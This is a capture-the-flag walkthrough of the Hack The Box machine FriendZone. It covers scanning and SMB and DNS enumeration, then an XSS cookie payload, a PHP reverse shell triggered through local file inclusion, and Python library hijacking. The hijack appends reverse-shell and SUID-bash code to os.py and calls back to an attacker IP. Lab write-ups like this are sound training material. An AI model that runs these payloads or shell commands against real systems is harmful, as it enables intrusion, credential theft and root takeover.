# FriendZone

**Links:** [1](https://www.hackthebox.com/machines/friendzone)  [2](https://app.hackthebox.com/machines/FriendZone)

**Machine ip:** 10.10.10.123

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1327406c-3351-477c-965e-4691e330732c)


## Reconnaissance
First thing first, start with port scan to see which ports are open and which services are running on those ports.
+ `sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.123 -e tun0 > ports`
+ `ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
+ `sort -n -k4 ports`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/42dc5726-6e75-4ad2-8f32-7f3359d98147)

+ `sudo nmap -Pn -n -sV -sC -O -p$ports 10.10.10.123 --open`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a3d1b012-e398-4443-a368-0713c3a947f3)

+ `sudo nmap -Pn -n -sV -sC -sU -O -p$ports 10.10.10.123 --open`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ef8b3771-9af0-4ec8-a2e5-53372526c791)

+ The result shows that 7 tcp ports and 2 udp ports are open:
+ Open tcp ports:
```
Port tcp 21: vsftpd 3.0.3
Port tcp 22: OpenSSH 7.6p1 Ubuntu 4
Port tcp 53: ISC BIND 9.11.3-1ubuntu1.2
Port tcp 80: Apache httpd 2.4.29
Port tcp 139: Samba smbd 3.X - 4.X
Port tcp 443: Apache httpd 2.4.29
Port tcp 445: Samba smbd 4.7.6-Ubuntu
```
+ Open udp ports:
```
Port udp 53: ISC BIND 9.11.3-1ubuntu1.2
Port udp 137: Samba nmbd netbios-ns
```

Check port scan results:
+ **Port tcp 21, ftp:** Anonymous login is not allowed, then it requires credentials to access the FTP server. Moreover, the version is 3.0.3 which does not have any critical exploits.
+ **Port tcp 22, ssh:** There isn't any critical exploit associated with the version, so we need credentials for this service as well.
+ **Port tcp/udp 53, dns:** The first thing to do for this service is get the domain name with nslookup, and try a zone transfer to enumerate name servers, hostnames, etc. The ssl-cert from the port scan gives us the common name friendzone.red. Take note of it as it may be the target domain name.
+ **Ports tcp 80/443, http/https** are different page titles. It could be a virtual hosts routing configuration. If we discover other hosts, we need to enumerate them over both HTTP and HTTPS since they may give different results.
+ **Ports tcp 139/445, and udp 137:** Samba SMB ports are open. Check usual controls: try for anonymous login, list shares and check permissions on shares.


## Enumeration

### http-https
+ Add **friendzone.red** into the **/etc/hosts** file.
+ As usual, always start off with enumerating web server first. In this case both http and https are open.
+ Visit the web applications.
+ **Firstly**, navigate to `http://10.10.10.123/`, and take note of **info@friendzoneportal.red** which **friendzoneportal.red** may be a possible domain name.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c55ce1b0-e667-422a-ba94-3dda95e47fab)

+ View Page Source, and there's no useful information.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d19583f0-4d19-485b-aa3a-59d686b9cf91)

+ Directory fuzzing to enumerate directories:
```
gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.123/ -k -n -x html,php,txt -r -t 40
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/f67ccdbb-3c35-45d0-91fe-49400d791e26)

+ Do more directory fuzzing on **wordpress** directory:
```
gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.123/wordpress -k -n -x html,php,txt -r -t 40
```

+ **wordpress** directory and **robots.txt** are empty.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1d71713b-aa5d-4238-9c06-54350b13d483)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/37b6a433-9b7a-45ab-8c5c-41c6676c7388)

+ There is nothing here.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d8a4d69e-0102-4fa9-873b-d0202f5644ab)


+ **Secondly**, navigate to `https://10.10.10.123/`, and it gives 'Not Found' error.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3cb404f7-d7af-479c-8b4f-9cdd6ac478fc)

+ Visit `https://friendzone.red/`, and see the https site is different from the http site.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/b376d6c0-a098-429b-8fb7-9034436672ba)

+ View page source.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/42f53c2f-e8bc-48b7-846f-0308e17f16e8)

+ Directory fuzzing to enumerate directories:
```
gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://friendzone.red/ -k -n -x html,php,txt -r -t 40
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/79a164c6-0165-4eef-a09e-cebdc97b7d35)

+ admin directory is empty,  and visit **https://friendzone.red/js**.
+ Check `https://friendzone.red/js/js/`, and there's nothing useful.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/f9cbc884-adea-43d6-81e6-2335306495d1)


### smb
+ Fingerprint samba with crackmapexec: `crackmapexec smb 10.10.10.123`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/68f9687e-b288-4c0b-9b96-ba6209040aa9)

+ List available shares and permissions: `smbmap -H 10.10.10.123 `

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4c08c882-fdd7-4bae-9046-9639f94a64fb)

+ **Alternatively**, get a similar list without permissions from **smbclient** using **-N** for **null session** or **no auth** and **-L** to list:
```
smbclient -N -L //10.10.10.123
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/601c4600-35c8-456b-bd2f-a78696fa7ef7)

+ There are **READ** permission on the **general** share, and **READ/WRITE** permissions on the **Development** share.
+ And also results on the **Comment** column show that the files in the **Files** share are stored in **/etc/Files** on the system. Maybe **general** and **Development** follow the same pattern. No need to take risks using nmap nse:
```
nmap --script smb-enum-shares -p139,445 -T4 -Pn 10.10.10.123
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/174e2a79-5ada-46c5-810f-6ffbec20e8b8)

+ Take note of this piece of information as it may be required in the exploitation phase.

+ List recursively directories and files on all accessible shares: `smbmap -H 10.10.10.123 -r`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/9c20d2ac-c6dd-40fb-9af2-9f2c6dcd031d)

+ There's nothing on the **Development** share, but the **general** directory has a file called **creds.txt**.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a6fdb45c-29ea-4870-8e8e-5d351d74a793)

+ Login to null session general share anonymously without a password: `smbclient //10.10.10.123/general -N`
+ Download the creds.txt file from the target machine to the attack machine: `get creds.txt`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1308a185-f789-40f4-9468-ead9cc38def9)

+ View the content of the file: `cat creds.txt`
```
creds for the admin THING:

admin:WORKWORKHhallelujah@#
```

+ **Alternatively**, try: `impacket-smbclient guest@10.10.10.123`
```
impacket-smbclient guest@10.10.10.123
shares
use general
ls
cat creds.txt
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/013cdba2-fa00-4399-a7a6-386e1617b7c3)

+ Try these credentials on ftp login and ssh login, but they don't work.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d2c9d528-d9b5-4d70-b646-4269b35e2de7)


### dns
TCP is only used in DNS when the response size is greater than 512 bytes. Typically, this is associated with Zone Transfers, where the server give all the information it has for a domain. There are a few things to try to enumerate DNS, but the fact that the host is listening on TCP 53 suggests the first thing to try is a Zone Transfer.
+ **Firstly**, **dig** with **friendzone.red** domain on tls certificate after port scan results:
```
dig axfr @10.10.10.123 friendzone.red
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4dfc3112-628c-428f-921b-4cfa30cbf12a)

+ **Secondly**, **dig** with **friendzoneportal.red** from 'info@friendzoneportal.red' mail address on the first webpage:
```
dig axfr @10.10.10.123 friendzoneportal.red
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/8824b51e-478e-49d0-9340-afdf8cf92c50)

+ **Alternatively**, you can try the commands in the below:
```
host -l friendzone.red 10.10.10.123
host -l friendzoneportal.red 10.10.10.123
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/9039b9cb-a1fe-410e-af5e-531cfa506f2a)

+ **Alternatively 2**, specify query type:
```
host -t axfr friendzone.red friendzone.red
host -t axfr friendzoneportal.red friendzoneportal.red 
```

+ After these discovered subdomains, let's update hosts file for each of them.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/41fc16cd-582c-4049-9cf2-3860ebbf1d3a)

+ Check all of 8 subdomains visiting. Remember to visit them over both HTTP and HTTPS because it may give different results.
```
friendzoneportal.red -> Known as the "King of Pop" Michael Jackson's image!
administrator1.friendzone.red -> Login Form for FriendZone
hr.friendzone.red -> Not Found
uploads.friendzone.red -> upload page
admin.friendzoneportal.red -> login panel
files.friendzoneportal.red -> Not Found
imports.friendzoneportal.red -> Not Found
vpn.friendzoneportal.red -> Not Found
```

+ Visit `https://friendzoneportal.red`, and see **Known as the "King of Pop" Michael Jackson's image**!

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/f3f025a0-5a0b-4b14-bc3e-0cd6eaf92f23)

+ Visit `https://administrator1.friendzone.red/`, and there is a Login Form for FriendZone.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/604e18a2-6e68-4f64-8720-db50fd46d781)

+ `https://hr.friendzone.red/`: **Not Found.**
  
+ Visit `https://uploads.friendzone.red/`, and see upload page.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/938b0401-c97a-4e74-9523-73572dea06b7)

+ Visit `https://admin.friendzone.red`, and see the login panel.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a1523542-8f14-4f94-92c2-1e386ae2504a)

+ `https://files.friendzoneportal.red/`: **Not Found.**
+ `https://imports.friendzoneportal.red/`: **Not Found.**
+ `https://vpn.friendzoneportal.red/`: **Not Found.**

+ **Alternatively**, to be more quick: `cat domains.txt | aquatone`
```
┌──(kali㉿kali)-[~/Desktop]
└─$ cat domains.txt | aquatone                                                    
aquatone v1.7.0 started at 2024-02-08T01:21:05+03:00

Using unreliable Google Chrome for screenshots. Install Chromium for better results.

Targets    : 8
Threads    : 4
Ports      : 80, 443, 8000, 8080, 8443
Output dir : .

friendzoneportal.red: port 443 open
friendzoneportal.red: port 80 open
admin.friendzoneportal.red: port 80 open
hr.friendzone.red: port 80 open
administrator1.friendzone.red: port 80 open
uploads.friendzone.red: port 80 open
vpn.friendzoneportal.red: port 80 open
files.friendzoneportal.red: port 80 open
imports.friendzoneportal.red: port 80 open
admin.friendzoneportal.red: port 443 open
administrator1.friendzone.red: port 443 open
hr.friendzone.red: port 443 open
http://friendzoneportal.red/: 200 OK
uploads.friendzone.red: port 443 open
vpn.friendzoneportal.red: port 443 open
files.friendzoneportal.red: port 443 open
imports.friendzoneportal.red: port 443 open
https://friendzoneportal.red/: 200 OK
http://admin.friendzoneportal.red/: 200 OK
http://hr.friendzone.red/: 200 OK
http://administrator1.friendzone.red/: 200 OK
http://vpn.friendzoneportal.red/: 200 OK
http://uploads.friendzone.red/: 200 OK
http://files.friendzoneportal.red/: 200 OK
http://imports.friendzoneportal.red/: 200 OK
https://admin.friendzoneportal.red/: 200 OK
https://administrator1.friendzone.red/: 200 OK
https://hr.friendzone.red/: 404 Not Found
https://uploads.friendzone.red/: 200 OK
https://files.friendzoneportal.red/: 404 Not Found
https://vpn.friendzoneportal.red/: 404 Not Found
https://imports.friendzoneportal.red/: 404 Not Found
http://friendzoneportal.red/: screenshot successful
http://hr.friendzone.red/: screenshot successful
http://admin.friendzoneportal.red/: screenshot successful
https://friendzoneportal.red/: screenshot successful
http://administrator1.friendzone.red/: screenshot successful
http://vpn.friendzoneportal.red/: screenshot successful
http://uploads.friendzone.red/: screenshot successful
http://files.friendzoneportal.red/: screenshot successful
http://imports.friendzoneportal.red/: screenshot successful
https://admin.friendzoneportal.red/: screenshot successful
https://hr.friendzone.red/: screenshot successful
https://uploads.friendzone.red/: screenshot successful
https://administrator1.friendzone.red/: screenshot successful
https://files.friendzoneportal.red/: screenshot successful
https://vpn.friendzoneportal.red/: screenshot successful
https://imports.friendzoneportal.red/: screenshot successful
Calculating page structures... done
Clustering similar pages... done
Generating HTML report... done

Writing session file...Time:
 - Started at  : 2024-02-08T01:21:05+03:00
 - Finished at : 2024-02-08T01:21:45+03:00
 - Duration    : 39s

Requests:
 - Successful : 16
 - Failed     : 0

 - 2xx : 12
 - 3xx : 0
 - 4xx : 4
 - 5xx : 0

Screenshots:
 - Successful : 16
 - Failed     : 0

Wrote HTML report to: aquatone_report.html

```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/512f63bc-27ea-4eb8-9b89-f28169dee4f4)

+ Focus on login pages **https://admin.friendzone.red/** and **https://administrator1.friendzone.red/**.
+ **Primarily**, as always, try default credentials on the admin sites, but they don't work.
+ **Firstly**, navigate to `https://admin.friendzone.red/`, and login with previously discovered credentials `admin`:`WORKWORKHhallelujah@#` from SMB. It doesn't work, and skip it.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/113209b8-24c7-4eaa-8272-42d85b3e9f81)

+ **Next**, try the credentials `admin`:`WORKWORKHhallelujah@#` on `https://administrator1.friendzone.red/`.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/110cc9bc-4fe3-4d45-932b-2690d57d2196)

+ Visit the **/dashboard.php**. It seems to be a page that allows to view images on the site. We will probably try to gain initial access through this page.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/5d9e54aa-b4fd-402d-92af-307e66312ede)


## Gaining Access
+ The **dashboard.php** page gives instructions on how to view an image.
+ Append the suggested parameters **?image_id=a.jpg&pagename=timestamp** to the url, and visit `https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=timestamp`.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c73a2714-1bf3-461f-b856-9c023ac49200)

+ Directory fuzzing to enumerate directories on **https://administrator1.friendzone.red/**, and nothing is interesting.
```
gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://administrator1.friendzone.red/ -k -n -x html,php,txt -r -t 40
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7a0143cc-b2ce-4fcd-aee3-d4c569e1cbf8)


### image_id
+ Instead, focus on **?image_id=a.jpg&pagename=timestamp** parameters of `https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=timestamp`.
+ Try xss payload on **image_id** parameter:
```
jaVasCript:/-///'/"/*/(//oNcliCk=alert(1) )//%0D%0A%0d%0a //</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(document.cookie)//>\x3e
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/eea84d27-857d-442b-95ef-f59c1d3cee35)

+ It pop-ups, and but the image link is broken. Pass to the second parameter.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/9e45d00f-2dc9-44cc-866f-6f3246b21fc1)


### pagename
+ Remember duration of the enumeration phase, we discovered the **Development** share with READ and WRITE permissions from SMB, and it's likely that the files uploaded on that share are stored in the location /etc/Development based on the **Comments** column.
+ Try to upload a php revershell file to the target machine, and then exploit the LFI vulnerability to get a reverse shell.
+ Change the IP address and port number on a copy of **/usr/share/webshells/php/php-reverse-shell.php**.
+ Login into the Development share: `smbclient -N //10.10.10.123/Development`
+ Transfer the **shell.php** file from the attack machine to the share: `put shell.php`
+ **Alternatively**, `smbclient -N //10.10.10.123/Development -c 'put shell.php'`
+ **Alternatively 2**, `smbclient -N //10.10.10.123/Development -c 'put php-reverse-shell.php shell.php'`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2f395d03-f2e3-4bed-9d56-e62bb5b9aa7d)

+ Start a netcat listener on the attack machine: `nc -lnvp 4444`
+ Navigate to `https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/shell` to execute the reverse shell script from the website.
+ Don't forget to remove the **.php** extension of the php file since the application already does that for you.
+ Get a low level shell.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/187e2901-f577-42a9-b14e-9782f24b8989)

+ **Alternatively**, try to upload a [webshell](https://0xdf.gitlab.io/2019/07/13/htb-friendzone.html#webshell), and get a [reverse shell](https://0xdf.gitlab.io/2019/07/13/htb-friendzone.html#shell) using [webshell](https://0xdf.gitlab.io/2019/07/13/htb-friendzone.html#webshell).
+ Upgrade it to a better shell, do more stable.
```
python -c 'import pty; pty.spawn("/bin/bash")'
script /dev/null -c bash
CTRL^Z: Ctrl + Z
stty raw -echo; fg
reset
terminal type? 'screen' or 'xterm'
export TERM=xterm  
export SHELL=bash
stty rows 55 columns 285
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/29bb6a71-cbb5-4db0-b5ff-3038f7f9aede)

+ Now that we are on an interactive shell, and read the user flag, since the privileges are enough. 

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/f63315ec-5a66-49f5-be9f-7a1fa1208b6b)

+ Escalate privileges to get the root flag.


## Privilege Escalation: from 'www-data' to 'friend'
+ Check the file **mysql_data.conf** in **/var/www** directory.
+ Try to login with su or ssh using discovered these credentials `friend`:`Agpyu12!0.213$`.
```
www-data@FriendZone:/var/www$ cat mysql_data.conf 
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/02686888-3b74-4157-9865-6ffc699fab31)


## Privilege Escalation: from 'friend' to 'root'
+ Transfer [pspy32](https://github.com/DominicBreuker/pspy/releases) to the target, and run: `./pspy32`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/e74f2b68-c2df-4737-8b43-59da607df922)

+ Check processess, and see **/opt/server_admin/reporter.py** is being run every two minutes by root.
+ `ls -l /opt/server_admin/reporter.py`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/6e22c398-27be-41f5-99ee-77781fdb9593)

+ We only have read permission, and view the content of the file: `cat /opt/server_admin/reporter.py`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/9bc7768b-eb20-4ed3-85e4-0fb7fff7ffaf)

+ It says it's incomplete, and doesn't do much of anything.
+ Most of the script is commented out so there isn’t much to do there.
+ It does import the os module. It may be hijacked.
+ Locate the module on the machine: `locate os.py`
+ Navigate to the directory: `cd /usr/lib/python2.7`
+ View the permissions: `ls -l os.py`
+ **Alternatively**, `find -type f -writable -ls`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4be0605e-d48e-4b27-b7aa-1f6d6355f4c7)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a33af8f7-b88b-42fe-a2a0-c58cdb8842bd)

+ **Alternatively 2**, check writable directories: `find / -perm -222 -type d 2>/dev/null`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2b2abbfe-097a-4f70-97d3-7fcf38beaf3c)

+ **Alternatively 3**: `stat /usr/lib/python2.7`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c6b8c66f-7399-4ae2-8215-78fe7c492a8e)

+ **/usr/lib/python2.7** is world-writable which means that even if os.py is not-writable by friend anyone can just replace it with their own malicious library.

+ Add the python reverse shell code to the bottom of the **os.py** file.
+ Remove **os** from **os.dup2()**, and just write **dup2()** since we're in the os module.
+ Check [Python Library Hijacking](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/) about more.

```
#!/usr/bin/python
import socket
import subprocess

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.14",4444))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"]);
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/e2c438c4-2d5e-483e-827a-09978ffa7f41)

+ **Alternatively**, add the following one-liner standard reverse shell python script to the **os.py** file:
```
echo 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",4444));dup2(s.fileno(),0);dup2(s.fileno(),1);dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);s.close()' >> /usr/lib/python2.7/os.py
```

+ Start a netcat listener on the attack machine: `nc -lnvp 444`
+ Wait 2 minutes until to get the root shell.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/6f1117a6-c15f-4b48-be4e-9782a51c2919)


## Create A Bogus Python Library: An Alternative to Root Privilege Escalation
+ Taking privilege of python library, let's create a bogus python library named as os.py to call root flag through this file.
```
cd /tmp
echo "system ('cat /root/root.txt > /tmp/flag.txt')" >> /usr/lib/python2.7/os.py
```

+ Try these **alternatively**.
+ **1.** https://www.jeroenvansaane.com/posts/htb/friendzone/#privilege-escalation
```
echo "system ('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash')" >> /usr/lib/python2.7/os.py
./rootbash -p
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/da8d03fd-0a38-4cad-9584-688da3258bc0)

+ **2.** https://github.com/jebidiah-anthony/htb_friendzone?tab=readme-ov-file#part-4--privilege-escalation-friend---root
+ **3.** https://xavilok.es/posts/FriendZone.php


## Root Privilege Escalation: Alternative 1
+ Check smtp port on the target's localhost: `netstat -ant | grep 25`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/99dcb078-442a-463b-a8b6-09b57ec37f26)

+ For more, you can try [CVE-2019-10149](https://github.com/Diefunction/CVE-2019-10149), and [an alternative different approach](https://ivanitlearning.wordpress.com/2020/11/20/hackthebox-friendzone/).


## Root Privilege Escalation: Alternative 2
+ Check [CVE-2021-3156](https://www.exploit-db.com/exploits/49522) Sudo Baron Samedit vulnerability, and try to exploit using https://github.com/blasty/CVE-2021-3156.
+ For more, check https://hackmd.io/@Mecanico/Syu8fKUAc#⏫Root-Privesc.


# Technical Knowledge
+ [Python Library Hijacking](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/): https://rastating.github.io/privilege-escalation-via-python-library-hijacking/
+ https://www.tutorialspoint.com/What-are-pyc-files-in-Python
+ https://ethicalhacs.com/admirer-hackthebox-walkthrough/
+ https://www.hackingarticles.in/hack-the-box-friendzone-walkthrough/
+ https://github.com/jebidiah-anthony/htb_friendzone


# CVE Scripting
+ **CVE-2019-10149**: https://github.com/Diefunction/CVE-2019-10149
+ https://ivanitlearning.wordpress.com/2020/11/20/hackthebox-friendzone/
+ **CVE-2021-3156**: https://github.com/blasty/CVE-2021-3156
+ https://www.exploit-db.com/exploits/49522
+ https://hackmd.io/@Mecanico/Syu8fKUAc#⏫Root-Privesc


# References & Alternatives
+ https://vvmlist.github.io/#FriendZone
+ https://0xdf.gitlab.io/2019/07/13/htb-friendzone.html
+ https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/friendzone-writeup-w-o-metasploit
+ https://0xrick.github.io/hack-the-box/friendzone/
+ https://ethicalhacs.com/friendzone-hackthebox-walkthrough/
+ https://tanzilrehman.com/friendzone-htb-oscp-box-6cfacbdb5870
+ https://www.hackingarticles.in/hack-the-box-friendzone-walkthrough/
+ https://github.com/jebidiah-anthony/htb_friendzone
+ https://manuelvazquez-contact.gitbook.io/oscp-prep/hack-the-box/friendzoned
+ https://rootissh.in/hackthebox-friendzone-walkthrough-htb-e438711443f7
+ https://docs.gorigorisensei.com/hack-the-box-write-ups/htb-friendzone-22
+ https://hackmd.io/@Mecanico/Syu8fKUAc
+ https://xavilok.es/posts/FriendZone.php
+ https://hipotermia.pw/htb/friendzone
+ https://blog.mzfr.me/HackTheBox-writeups/Friendzone/
+ https://snowscan.io/htb-writeup-friendzone/#

